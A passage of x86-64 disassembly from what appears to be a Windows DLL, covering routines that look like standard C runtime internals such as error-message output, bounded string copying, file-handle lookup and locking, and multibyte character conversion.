   18000654c:	48 8d 2d ad 72 00 00 	lea    0x72ad(%rip),%rbp        # 0x18000d800
   180006553:	41 bc 14 03 00 00    	mov    $0x314,%r12d
   180006559:	4c 8d 05 d0 3d 00 00 	lea    0x3dd0(%rip),%r8        # 0x18000a330
   180006560:	48 8b cd             	mov    %rbp,%rcx
   180006563:	41 8b d4             	mov    %r12d,%edx
   180006566:	e8 e1 1c 00 00       	call   0x18000824c
   18000656b:	33 c9                	xor    %ecx,%ecx
   18000656d:	85 c0                	test   %eax,%eax
   18000656f:	0f 85 14 01 00 00    	jne    0x180006689
   180006575:	4c 8d 2d b6 72 00 00 	lea    0x72b6(%rip),%r13        # 0x18000d832
   18000657c:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180006582:	66 89 35 b1 74 00 00 	mov    %si,0x74b1(%rip)        # 0x18000da3a
   180006589:	49 8b d5             	mov    %r13,%rdx
   18000658c:	ff 15 5e 2c 00 00    	call   *0x2c5e(%rip)        # 0x1800091f0
   180006592:	41 8d 7c 24 e7       	lea    -0x19(%r12),%edi
   180006597:	85 c0                	test   %eax,%eax
   180006599:	75 2a                	jne    0x1800065c5
   18000659b:	4c 8d 05 5e 3d 00 00 	lea    0x3d5e(%rip),%r8        # 0x18000a300
   1800065a2:	8b d7                	mov    %edi,%edx
   1800065a4:	49 8b cd             	mov    %r13,%rcx
   1800065a7:	e8 a0 1c 00 00       	call   0x18000824c
   1800065ac:	85 c0                	test   %eax,%eax
   1800065ae:	74 15                	je     0x1800065c5
   1800065b0:	45 33 c9             	xor    %r9d,%r9d
   1800065b3:	45 33 c0             	xor    %r8d,%r8d
   1800065b6:	33 d2                	xor    %edx,%edx
   1800065b8:	33 c9                	xor    %ecx,%ecx
   1800065ba:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800065bf:	e8 d0 bf ff ff       	call   0x180002594
   1800065c4:	cc                   	int3
   1800065c5:	49 8b cd             	mov    %r13,%rcx
   1800065c8:	e8 63 1c 00 00       	call   0x180008230
   1800065cd:	48 ff c0             	inc    %rax
   1800065d0:	48 83 f8 3c          	cmp    $0x3c,%rax
   1800065d4:	76 47                	jbe    0x18000661d
   1800065d6:	49 8b cd             	mov    %r13,%rcx
   1800065d9:	e8 52 1c 00 00       	call   0x180008230
   1800065de:	4c 8d 05 13 3d 00 00 	lea    0x3d13(%rip),%r8        # 0x18000a2f8
   1800065e5:	41 b9 03 00 00 00    	mov    $0x3,%r9d
   1800065eb:	48 8d 4c 45 bc       	lea    -0x44(%rbp,%rax,2),%rcx
   1800065f0:	48 8b c1             	mov    %rcx,%rax
   1800065f3:	49 2b c5             	sub    %r13,%rax
   1800065f6:	48 d1 f8             	sar    $1,%rax
   1800065f9:	48 2b f8             	sub    %rax,%rdi
   1800065fc:	48 8b d7             	mov    %rdi,%rdx
   1800065ff:	e8 5c 1b 00 00       	call   0x180008160
   180006604:	85 c0                	test   %eax,%eax
   180006606:	74 15                	je     0x18000661d
   180006608:	45 33 c9             	xor    %r9d,%r9d
   18000660b:	45 33 c0             	xor    %r8d,%r8d
   18000660e:	33 d2                	xor    %edx,%edx
   180006610:	33 c9                	xor    %ecx,%ecx
   180006612:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180006617:	e8 78 bf ff ff       	call   0x180002594
   18000661c:	cc                   	int3
   18000661d:	4c 8d 05 c8 3c 00 00 	lea    0x3cc8(%rip),%r8        # 0x18000a2ec
   180006624:	49 8b d4             	mov    %r12,%rdx
   180006627:	48 8b cd             	mov    %rbp,%rcx
   18000662a:	e8 a9 1a 00 00       	call   0x1800080d8
   18000662f:	85 c0                	test   %eax,%eax
   180006631:	75 41                	jne    0x180006674
   180006633:	4c 8b c3             	mov    %rbx,%r8
   180006636:	49 8b d4             	mov    %r12,%rdx
   180006639:	48 8b cd             	mov    %rbp,%rcx
   18000663c:	e8 97 1a 00 00       	call   0x1800080d8
   180006641:	85 c0                	test   %eax,%eax
   180006643:	75 1a                	jne    0x18000665f
   180006645:	48 8d 15 54 3c 00 00 	lea    0x3c54(%rip),%rdx        # 0x18000a2a0
   18000664c:	41 b8 10 20 01 00    	mov    $0x12010,%r8d
   180006652:	48 8b cd             	mov    %rbp,%rcx
   180006655:	e8 76 18 00 00       	call   0x180007ed0
   18000665a:	e9 a5 00 00 00       	jmp    0x180006704
   18000665f:	45 33 c9             	xor    %r9d,%r9d
   180006662:	45 33 c0             	xor    %r8d,%r8d
   180006665:	33 d2                	xor    %edx,%edx
   180006667:	33 c9                	xor    %ecx,%ecx
   180006669:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000666e:	e8 21 bf ff ff       	call   0x180002594
   180006673:	cc                   	int3
   180006674:	45 33 c9             	xor    %r9d,%r9d
   180006677:	45 33 c0             	xor    %r8d,%r8d
   18000667a:	33 d2                	xor    %edx,%edx
   18000667c:	33 c9                	xor    %ecx,%ecx
   18000667e:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180006683:	e8 0c bf ff ff       	call   0x180002594
   180006688:	cc                   	int3
   180006689:	45 33 c9             	xor    %r9d,%r9d
   18000668c:	45 33 c0             	xor    %r8d,%r8d
   18000668f:	33 d2                	xor    %edx,%edx
   180006691:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180006696:	e8 f9 be ff ff       	call   0x180002594
   18000669b:	cc                   	int3
   18000669c:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   1800066a1:	ff 15 61 2a 00 00    	call   *0x2a61(%rip)        # 0x180009108
   1800066a7:	48 8b f8             	mov    %rax,%rdi
   1800066aa:	48 85 c0             	test   %rax,%rax
   1800066ad:	74 55                	je     0x180006704
   1800066af:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800066b3:	74 4f                	je     0x180006704
   1800066b5:	8b d6                	mov    %esi,%edx
   1800066b7:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1800066bc:	8a 0b                	mov    (%rbx),%cl
   1800066be:	41 88 08             	mov    %cl,(%r8)
   1800066c1:	66 39 33             	cmp    %si,(%rbx)
   1800066c4:	74 11                	je     0x1800066d7
   1800066c6:	ff c2                	inc    %edx
   1800066c8:	49 ff c0             	inc    %r8
   1800066cb:	48 83 c3 02          	add    $0x2,%rbx
   1800066cf:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
   1800066d5:	72 e5                	jb     0x1800066bc
   1800066d7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1800066dc:	40 88 b4 24 33 02 00 	mov    %sil,0x233(%rsp)
   1800066e3:	00 
   1800066e4:	e8 b7 f2 ff ff       	call   0x1800059a0
   1800066e9:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1800066ee:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800066f3:	48 8b cf             	mov    %rdi,%rcx
   1800066f6:	4c 8b c0             	mov    %rax,%r8
   1800066f9:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800066fe:	ff 15 04 29 00 00    	call   *0x2904(%rip)        # 0x180009008
   180006704:	48 8b 8c 24 40 02 00 	mov    0x240(%rsp),%rcx
   18000670b:	00 
   18000670c:	48 33 cc             	xor    %rsp,%rcx
   18000670f:	e8 4c f3 ff ff       	call   0x180005a60
   180006714:	4c 8d 9c 24 50 02 00 	lea    0x250(%rsp),%r11
   18000671b:	00 
   18000671c:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   180006720:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   180006724:	49 8b 73 38          	mov    0x38(%r11),%rsi
   180006728:	49 8b e3             	mov    %r11,%rsp
   18000672b:	41 5d                	pop    %r13
   18000672d:	41 5c                	pop    %r12
   18000672f:	5f                   	pop    %rdi
   180006730:	c3                   	ret
   180006731:	cc                   	int3
   180006732:	cc                   	int3
   180006733:	cc                   	int3
   180006734:	48 83 ec 28          	sub    $0x28,%rsp
   180006738:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000673d:	e8 76 1b 00 00       	call   0x1800082b8
   180006742:	83 f8 01             	cmp    $0x1,%eax
   180006745:	74 17                	je     0x18000675e
   180006747:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000674c:	e8 67 1b 00 00       	call   0x1800082b8
   180006751:	85 c0                	test   %eax,%eax
   180006753:	75 1d                	jne    0x180006772
   180006755:	83 3d 6c 6c 00 00 01 	cmpl   $0x1,0x6c6c(%rip)        # 0x18000d3c8
   18000675c:	75 14                	jne    0x180006772
   18000675e:	b9 fc 00 00 00       	mov    $0xfc,%ecx
   180006763:	e8 6c fd ff ff       	call   0x1800064d4
   180006768:	b9 ff 00 00 00       	mov    $0xff,%ecx
   18000676d:	e8 62 fd ff ff       	call   0x1800064d4
   180006772:	48 83 c4 28          	add    $0x28,%rsp
   180006776:	c3                   	ret
   180006777:	cc                   	int3
   180006778:	40 53                	rex push %rbx
   18000677a:	48 83 ec 20          	sub    $0x20,%rsp
   18000677e:	48 85 c9             	test   %rcx,%rcx
   180006781:	74 0d                	je     0x180006790
   180006783:	48 85 d2             	test   %rdx,%rdx
   180006786:	74 08                	je     0x180006790
   180006788:	4d 85 c0             	test   %r8,%r8
   18000678b:	75 1c                	jne    0x1800067a9
   18000678d:	44 88 01             	mov    %r8b,(%rcx)
   180006790:	e8 0b bf ff ff       	call   0x1800026a0
   180006795:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000679a:	89 18                	mov    %ebx,(%rax)
   18000679c:	e8 97 be ff ff       	call   0x180002638
   1800067a1:	8b c3                	mov    %ebx,%eax
   1800067a3:	48 83 c4 20          	add    $0x20,%rsp
   1800067a7:	5b                   	pop    %rbx
   1800067a8:	c3                   	ret
   1800067a9:	4c 8b c9             	mov    %rcx,%r9
   1800067ac:	4d 2b c8             	sub    %r8,%r9
   1800067af:	41 8a 00             	mov    (%r8),%al
   1800067b2:	43 88 04 01          	mov    %al,(%r9,%r8,1)
   1800067b6:	49 ff c0             	inc    %r8
   1800067b9:	84 c0                	test   %al,%al
   1800067bb:	74 05                	je     0x1800067c2
   1800067bd:	48 ff ca             	dec    %rdx
   1800067c0:	75 ed                	jne    0x1800067af
   1800067c2:	48 85 d2             	test   %rdx,%rdx
   1800067c5:	75 0e                	jne    0x1800067d5
   1800067c7:	88 11                	mov    %dl,(%rcx)
   1800067c9:	e8 d2 be ff ff       	call   0x1800026a0
   1800067ce:	bb 22 00 00 00       	mov    $0x22,%ebx
   1800067d3:	eb c5                	jmp    0x18000679a
   1800067d5:	33 c0                	xor    %eax,%eax
   1800067d7:	eb ca                	jmp    0x1800067a3
   1800067d9:	cc                   	int3
   1800067da:	cc                   	int3
   1800067db:	cc                   	int3
   1800067dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800067e1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800067e6:	57                   	push   %rdi
   1800067e7:	48 83 ec 40          	sub    $0x40,%rsp
   1800067eb:	8b da                	mov    %edx,%ebx
   1800067ed:	48 8b d1             	mov    %rcx,%rdx
   1800067f0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800067f5:	41 8b f9             	mov    %r9d,%edi
   1800067f8:	41 8b f0             	mov    %r8d,%esi
   1800067fb:	e8 bc af ff ff       	call   0x1800017bc
   180006800:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180006805:	44 0f b6 db          	movzbl %bl,%r11d
   180006809:	41 84 7c 03 1d       	test   %dil,0x1d(%r11,%rax,1)
   18000680e:	75 1f                	jne    0x18000682f
   180006810:	85 f6                	test   %esi,%esi
   180006812:	74 15                	je     0x180006829
   180006814:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180006819:	48 8b 88 40 01 00 00 	mov    0x140(%rax),%rcx
   180006820:	42 0f b7 04 59       	movzwl (%rcx,%r11,2),%eax
   180006825:	23 c6                	and    %esi,%eax
   180006827:	eb 02                	jmp    0x18000682b
   180006829:	33 c0                	xor    %eax,%eax
   18000682b:	85 c0                	test   %eax,%eax
   18000682d:	74 05                	je     0x180006834
   18000682f:	b8 01 00 00 00       	mov    $0x1,%eax
   180006834:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   180006839:	74 0c                	je     0x180006847
   18000683b:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180006840:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180006847:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000684c:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180006851:	48 83 c4 40          	add    $0x40,%rsp
   180006855:	5f                   	pop    %rdi
   180006856:	c3                   	ret
   180006857:	cc                   	int3
   180006858:	8b d1                	mov    %ecx,%edx
   18000685a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180006860:	45 33 c0             	xor    %r8d,%r8d
   180006863:	33 c9                	xor    %ecx,%ecx
   180006865:	e9 72 ff ff ff       	jmp    0x1800067dc
   18000686a:	cc                   	int3
   18000686b:	cc                   	int3
   18000686c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006871:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180006876:	57                   	push   %rdi
   180006877:	48 83 ec 20          	sub    $0x20,%rsp
   18000687b:	85 c9                	test   %ecx,%ecx
   18000687d:	78 71                	js     0x1800068f0
   18000687f:	3b 0d 7f 8b 00 00    	cmp    0x8b7f(%rip),%ecx        # 0x18000f404
   180006885:	73 69                	jae    0x1800068f0
   180006887:	48 63 d9             	movslq %ecx,%rbx
   18000688a:	48 8d 2d 8f 8b 00 00 	lea    0x8b8f(%rip),%rbp        # 0x18000f420
   180006891:	48 8b fb             	mov    %rbx,%rdi
   180006894:	83 e3 1f             	and    $0x1f,%ebx
   180006897:	48 c1 ff 05          	sar    $0x5,%rdi
   18000689b:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   18000689f:	48 8b 44 fd 00       	mov    0x0(%rbp,%rdi,8),%rax
   1800068a4:	f6 44 18 08 01       	testb  $0x1,0x8(%rax,%rbx,1)
   1800068a9:	74 45                	je     0x1800068f0
   1800068ab:	48 83 3c 18 ff       	cmpq   $0xffffffffffffffff,(%rax,%rbx,1)
   1800068b0:	74 3e                	je     0x1800068f0
   1800068b2:	83 3d 0f 6b 00 00 01 	cmpl   $0x1,0x6b0f(%rip)        # 0x18000d3c8
   1800068b9:	75 27                	jne    0x1800068e2
   1800068bb:	85 c9                	test   %ecx,%ecx
   1800068bd:	74 16                	je     0x1800068d5
   1800068bf:	ff c9                	dec    %ecx
   1800068c1:	74 0b                	je     0x1800068ce
   1800068c3:	ff c9                	dec    %ecx
   1800068c5:	75 1b                	jne    0x1800068e2
   1800068c7:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   1800068cc:	eb 0c                	jmp    0x1800068da
   1800068ce:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   1800068d3:	eb 05                	jmp    0x1800068da
   1800068d5:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   1800068da:	33 d2                	xor    %edx,%edx
   1800068dc:	ff 15 16 29 00 00    	call   *0x2916(%rip)        # 0x1800091f8
   1800068e2:	48 8b 44 fd 00       	mov    0x0(%rbp,%rdi,8),%rax
   1800068e7:	48 83 0c 03 ff       	orq    $0xffffffffffffffff,(%rbx,%rax,1)
   1800068ec:	33 c0                	xor    %eax,%eax
   1800068ee:	eb 16                	jmp    0x180006906
   1800068f0:	e8 ab bd ff ff       	call   0x1800026a0
   1800068f5:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1800068fb:	e8 c0 bd ff ff       	call   0x1800026c0
   180006900:	83 20 00             	andl   $0x0,(%rax)
   180006903:	83 c8 ff             	or     $0xffffffff,%eax
   180006906:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000690b:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180006910:	48 83 c4 20          	add    $0x20,%rsp
   180006914:	5f                   	pop    %rdi
   180006915:	c3                   	ret
   180006916:	cc                   	int3
   180006917:	cc                   	int3
   180006918:	48 83 ec 28          	sub    $0x28,%rsp
   18000691c:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   18000691f:	75 15                	jne    0x180006936
   180006921:	e8 9a bd ff ff       	call   0x1800026c0
   180006926:	83 20 00             	andl   $0x0,(%rax)
   180006929:	e8 72 bd ff ff       	call   0x1800026a0
   18000692e:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180006934:	eb 4d                	jmp    0x180006983
   180006936:	85 c9                	test   %ecx,%ecx
   180006938:	78 31                	js     0x18000696b
   18000693a:	3b 0d c4 8a 00 00    	cmp    0x8ac4(%rip),%ecx        # 0x18000f404
   180006940:	73 29                	jae    0x18000696b
   180006942:	48 63 d1             	movslq %ecx,%rdx
   180006945:	48 8d 0d d4 8a 00 00 	lea    0x8ad4(%rip),%rcx        # 0x18000f420
   18000694c:	48 8b c2             	mov    %rdx,%rax
   18000694f:	83 e2 1f             	and    $0x1f,%edx
   180006952:	48 c1 f8 05          	sar    $0x5,%rax
   180006956:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   18000695a:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   18000695e:	f6 44 10 08 01       	testb  $0x1,0x8(%rax,%rdx,1)
   180006963:	74 06                	je     0x18000696b
   180006965:	48 8b 04 10          	mov    (%rax,%rdx,1),%rax
   180006969:	eb 1c                	jmp    0x180006987
   18000696b:	e8 50 bd ff ff       	call   0x1800026c0
   180006970:	83 20 00             	andl   $0x0,(%rax)
   180006973:	e8 28 bd ff ff       	call   0x1800026a0
   180006978:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000697e:	e8 b5 bc ff ff       	call   0x180002638
   180006983:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180006987:	48 83 c4 28          	add    $0x28,%rsp
   18000698b:	c3                   	ret
   18000698c:	48 8b c4             	mov    %rsp,%rax
   18000698f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180006993:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180006997:	48 89 78 18          	mov    %rdi,0x18(%rax)
   18000699b:	4c 89 60 20          	mov    %r12,0x20(%rax)
   18000699f:	41 56                	push   %r14
   1800069a1:	48 83 ec 20          	sub    $0x20,%rsp
   1800069a5:	48 63 d9             	movslq %ecx,%rbx
   1800069a8:	4c 8b e3             	mov    %rbx,%r12
   1800069ab:	49 c1 fc 05          	sar    $0x5,%r12
   1800069af:	4c 8d 35 6a 8a 00 00 	lea    0x8a6a(%rip),%r14        # 0x18000f420
   1800069b6:	83 e3 1f             	and    $0x1f,%ebx
   1800069b9:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   1800069bd:	4b 8b 34 e6          	mov    (%r14,%r12,8),%rsi
   1800069c1:	bf 01 00 00 00       	mov    $0x1,%edi
   1800069c6:	83 7c 33 0c 00       	cmpl   $0x0,0xc(%rbx,%rsi,1)
   1800069cb:	75 34                	jne    0x180006a01
   1800069cd:	8d 4f 09             	lea    0x9(%rdi),%ecx
   1800069d0:	e8 0b f4 ff ff       	call   0x180005de0
   1800069d5:	90                   	nop
   1800069d6:	83 7c 33 0c 00       	cmpl   $0x0,0xc(%rbx,%rsi,1)
   1800069db:	75 1a                	jne    0x1800069f7
   1800069dd:	48 8d 4c 33 10       	lea    0x10(%rbx,%rsi,1),%rcx
   1800069e2:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1800069e7:	ff 15 23 27 00 00    	call   *0x2723(%rip)        # 0x180009110
   1800069ed:	f7 d8                	neg    %eax
   1800069ef:	1b d2                	sbb    %edx,%edx
   1800069f1:	23 fa                	and    %edx,%edi
   1800069f3:	ff 44 33 0c          	incl   0xc(%rbx,%rsi,1)
   1800069f7:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1800069fc:	e8 df f2 ff ff       	call   0x180005ce0
   180006a01:	85 ff                	test   %edi,%edi
   180006a03:	74 0f                	je     0x180006a14
   180006a05:	4b 8b 0c e6          	mov    (%r14,%r12,8),%rcx
   180006a09:	48 8d 4c 19 10       	lea    0x10(%rcx,%rbx,1),%rcx
   180006a0e:	ff 15 94 27 00 00    	call   *0x2794(%rip)        # 0x1800091a8
   180006a14:	8b c7                	mov    %edi,%eax
   180006a16:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180006a1b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180006a20:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   180006a25:	4c 8b 64 24 48       	mov    0x48(%rsp),%r12
   180006a2a:	48 83 c4 20          	add    $0x20,%rsp
   180006a2e:	41 5e                	pop    %r14
   180006a30:	c3                   	ret
   180006a31:	cc                   	int3
   180006a32:	cc                   	int3
   180006a33:	cc                   	int3
   180006a34:	48 63 d1             	movslq %ecx,%rdx
   180006a37:	48 8d 0d e2 89 00 00 	lea    0x89e2(%rip),%rcx        # 0x18000f420
   180006a3e:	48 8b c2             	mov    %rdx,%rax
   180006a41:	83 e2 1f             	and    $0x1f,%edx
   180006a44:	48 c1 f8 05          	sar    $0x5,%rax
   180006a48:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   180006a4c:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   180006a50:	48 8d 4c 10 10       	lea    0x10(%rax,%rdx,1),%rcx
   180006a55:	48 ff 25 54 27 00 00 	rex.W jmp *0x2754(%rip)        # 0x1800091b0
   180006a5c:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   180006a61:	48 83 ec 38          	sub    $0x38,%rsp
   180006a65:	48 8b 0d 14 68 00 00 	mov    0x6814(%rip),%rcx        # 0x18000d280
   180006a6c:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   180006a70:	75 0c                	jne    0x180006a7e
   180006a72:	e8 81 18 00 00       	call   0x1800082f8
   180006a77:	48 8b 0d 02 68 00 00 	mov    0x6802(%rip),%rcx        # 0x18000d280
   180006a7e:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   180006a82:	75 07                	jne    0x180006a8b
   180006a84:	b8 ff ff 00 00       	mov    $0xffff,%eax
   180006a89:	eb 25                	jmp    0x180006ab0
   180006a8b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   180006a91:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180006a96:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180006a9b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   180006aa1:	ff 15 59 27 00 00    	call   *0x2759(%rip)        # 0x180009200
   180006aa7:	85 c0                	test   %eax,%eax
   180006aa9:	74 d9                	je     0x180006a84
   180006aab:	0f b7 44 24 40       	movzwl 0x40(%rsp),%eax
   180006ab0:	48 83 c4 38          	add    $0x38,%rsp
   180006ab4:	c3                   	ret
   180006ab5:	cc                   	int3
   180006ab6:	cc                   	int3
   180006ab7:	cc                   	int3
   180006ab8:	48 8b c4             	mov    %rsp,%rax
   180006abb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180006abf:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180006ac3:	48 89 78 18          	mov    %rdi,0x18(%rax)
   180006ac7:	4c 89 60 20          	mov    %r12,0x20(%rax)
   180006acb:	55                   	push   %rbp
   180006acc:	48 8b ec             	mov    %rsp,%rbp
   180006acf:	48 83 ec 50          	sub    $0x50,%rsp
   180006ad3:	45 33 e4             	xor    %r12d,%r12d
   180006ad6:	49 8b f0             	mov    %r8,%rsi
   180006ad9:	48 8b fa             	mov    %rdx,%rdi
   180006adc:	48 8b d9             	mov    %rcx,%rbx
   180006adf:	48 85 d2             	test   %rdx,%rdx
   180006ae2:	74 13                	je     0x180006af7
   180006ae4:	4d 85 c0             	test   %r8,%r8
   180006ae7:	74 0e                	je     0x180006af7
   180006ae9:	44 38 22             	cmp    %r12b,(%rdx)
   180006aec:	75 25                	jne    0x180006b13
   180006aee:	48 85 c9             	test   %rcx,%rcx
   180006af1:	74 04                	je     0x180006af7
   180006af3:	66 44 89 21          	mov    %r12w,(%rcx)
   180006af7:	33 c0                	xor    %eax,%eax
   180006af9:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   180006afe:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   180006b03:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   180006b08:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   180006b0d:	48 83 c4 50          	add    $0x50,%rsp
   180006b11:	5d                   	pop    %rbp
   180006b12:	c3                   	ret
   180006b13:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   180006b17:	49 8b d1             	mov    %r9,%rdx
   180006b1a:	e8 9d ac ff ff       	call   0x1800017bc
   180006b1f:	4c 8b 5d e0          	mov    -0x20(%rbp),%r11
   180006b23:	45 39 63 14          	cmp    %r12d,0x14(%r11)
   180006b27:	75 23                	jne    0x180006b4c
   180006b29:	48 85 db             	test   %rbx,%rbx
   180006b2c:	74 06                	je     0x180006b34
   180006b2e:	0f b6 07             	movzbl (%rdi),%eax
   180006b31:	66 89 03             	mov    %ax,(%rbx)
   180006b34:	44 38 65 f8          	cmp    %r12b,-0x8(%rbp)
   180006b38:	74 0b                	je     0x180006b45
   180006b3a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   180006b3e:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   180006b45:	b8 01 00 00 00       	mov    $0x1,%eax
   180006b4a:	eb ad                	jmp    0x180006af9
   180006b4c:	0f b6 0f             	movzbl (%rdi),%ecx
   180006b4f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   180006b53:	e8 78 eb ff ff       	call   0x1800056d0
   180006b58:	85 c0                	test   %eax,%eax
   180006b5a:	0f 84 97 00 00 00    	je     0x180006bf7
   180006b60:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   180006b64:	44 8b 89 0c 01 00 00 	mov    0x10c(%rcx),%r9d
   180006b6b:	41 83 f9 01          	cmp    $0x1,%r9d
   180006b6f:	7e 30                	jle    0x180006ba1
   180006b71:	41 3b f1             	cmp    %r9d,%esi
   180006b74:	7c 2b                	jl     0x180006ba1
   180006b76:	8b 49 04             	mov    0x4(%rcx),%ecx
   180006b79:	41 8b c4             	mov    %r12d,%eax
   180006b7c:	48 85 db             	test   %rbx,%rbx
   180006b7f:	0f 95 c0             	setne  %al
   180006b82:	4c 8b c7             	mov    %rdi,%r8
   180006b85:	ba 09 00 00 00       	mov    $0x9,%edx
   180006b8a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180006b8e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180006b93:	ff 15 6f 26 00 00    	call   *0x266f(%rip)        # 0x180009208
   180006b99:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   180006b9d:	85 c0                	test   %eax,%eax
   180006b9f:	75 12                	jne    0x180006bb3
   180006ba1:	48 63 81 0c 01 00 00 	movslq 0x10c(%rcx),%rax
   180006ba8:	48 3b f0             	cmp    %rax,%rsi
   180006bab:	72 26                	jb     0x180006bd3
   180006bad:	44 38 67 01          	cmp    %r12b,0x1(%rdi)
   180006bb1:	74 20                	je     0x180006bd3
   180006bb3:	8b 81 0c 01 00 00    	mov    0x10c(%rcx),%eax
   180006bb9:	44 38 65 f8          	cmp    %r12b,-0x8(%rbp)
   180006bbd:	0f 84 36 ff ff ff    	je     0x180006af9
   180006bc3:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   180006bc7:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   180006bce:	e9 26 ff ff ff       	jmp    0x180006af9
   180006bd3:	e8 c8 ba ff ff       	call   0x1800026a0
   180006bd8:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   180006bde:	44 38 65 f8          	cmp    %r12b,-0x8(%rbp)
   180006be2:	74 0b                	je     0x180006bef
   180006be4:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   180006be8:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   180006bef:	83 c8 ff             	or     $0xffffffff,%eax
   180006bf2:	e9 02 ff ff ff       	jmp    0x180006af9
   180006bf7:	41 8b c4             	mov    %r12d,%eax
   180006bfa:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180006c00:	48 85 db             	test   %rbx,%rbx
   180006c03:	0f 95 c0             	setne  %al
   180006c06:	41 8d 51 08          	lea    0x8(%r9),%edx
   180006c0a:	4c 8b c7             	mov    %rdi,%r8
   180006c0d:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180006c11:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   180006c15:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180006c1a:	8b 48 04             	mov    0x4(%rax),%ecx
   180006c1d:	ff 15 e5 25 00 00    	call   *0x25e5(%rip)        # 0x180009208
   180006c23:	85 c0                	test   %eax,%eax
   180006c25:	0f 85 09 ff ff ff    	jne    0x180006b34
   180006c2b:	eb a6                	jmp    0x180006bd3
   180006c2d:	cc                   	int3
   180006c2e:	cc                   	int3
   180006c2f:	cc                   	int3
   180006c30:	45 33 c9             	xor    %r9d,%r9d
   180006c33:	e9 80 fe ff ff       	jmp    0x180006ab8
   180006c38:	cc                   	int3
   180006c39:	cc                   	int3
   180006c3a:	cc                   	int3
   180006c3b:	cc                   	int3
   180006c3c:	cc                   	int3
   180006c3d:	cc                   	int3
   180006c3e:	cc                   	int3
   180006c3f:	cc                   	int3
   180006c40:	cc                   	int3
   180006c41:	cc                   	int3
   180006c42:	cc                   	int3
   180006c43:	cc                   	int3
